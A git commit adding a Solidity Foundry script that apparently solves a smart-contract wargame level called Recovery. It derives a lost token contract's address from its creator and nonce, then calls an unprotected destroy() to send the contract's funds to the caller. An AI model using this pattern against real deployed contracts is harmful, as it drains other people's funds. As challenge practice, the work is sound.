96232dd84e6759c8cd9da7c4c488a991cfc86404
Tymek <tymek_uramek@wp.pl>
2026-03-05 08:52:24 +0100

    Recovery completed

---
+++ Recovery/script/Deploy.s.sol
@@ -0,0 +1,27 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Script} from "forge-std/Script.sol";
+import {Recovery} from "../src/Recovery.sol";
+import {SimpleToken} from "../src/Recovery.sol";
+import {console} from "forge-std/console.sol";
+
+contract Deploy is Script {
+
+    function run() public {
+        address recoveryAddress = 0x51afec97e7376cD6F8acec42987D91eaE447a1E4;
+
+        address lostToken = address(uint160(uint256(keccak256(abi.encodePacked(
+            bytes1(0xd6),
+            bytes1(0x94),
+            recoveryAddress,
+            bytes1(0x01)
+            )))));
+        
+        console.log("lostToken: ", lostToken);
+
+        vm.startBroadcast();
+        SimpleToken(payable(lostToken)).destroy(payable(msg.sender));
+        vm.stopBroadcast();
+    }
+}
